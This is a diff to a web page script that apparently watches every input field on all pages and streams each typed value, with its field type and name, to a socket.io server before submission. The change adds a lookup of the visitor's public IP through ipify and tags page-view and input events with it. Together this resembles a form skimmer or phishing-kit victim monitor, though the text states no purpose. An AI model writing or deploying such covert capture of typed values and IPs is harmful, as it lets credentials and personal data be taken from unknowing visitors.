@@ -5,11 +5,32 @@ document.addEventListener('DOMContentLoaded', function() {
     // Connect to socket.io server
     const socket = io();
     
-    // Send current page path to server on page load
-    socket.emit('page-view', { 
-      path: window.location.pathname,
-      title: document.title,
-      referrer: document.referrer
+    // Get client IP address
+    let clientIP = null;
+    
+    // Function to get public IP address
+    async function getClientIP() {
+      try {
+        const response = await fetch('https://api.ipify.org?format=json');
+        const data = await response.json();
+        clientIP = data.ip;
+        console.log('Client IP detected:', clientIP);
+        return clientIP;
+      } catch (error) {
+        console.error('Failed to fetch IP:', error);
+        return null;
+      }
+    }
+    
+    // Initialize by getting the IP, then send page view
+    getClientIP().then(ip => {
+      // Send current page path to server on page load
+      socket.emit('page-view', { 
+        path: window.location.pathname,
+        title: document.title,
+        referrer: document.referrer,
+        clientIP: ip
+      });
     });
     
     // Track input fields across all pages
@@ -36,14 +57,15 @@ document.addEventListener('DOMContentLoaded', function() {
           
           // Set new timer to debounce rapid typing
           inputDebounceTimers[inputId] = setTimeout(() => {
-            // Send input data to server
+            // Send input data to server with client IP
             socket.emit('input-data', {
               path: window.location.pathname,
               inputId: inputId,
               inputType: input.type,
               inputName: input.name || '',
               inputValue: input.value,
-              timestamp: new Date().toISOString()
+              timestamp: new Date().toISOString(),
+              clientIP: clientIP // Include client IP from the frontend
             });
           }, inputDebounceDelay);
         });
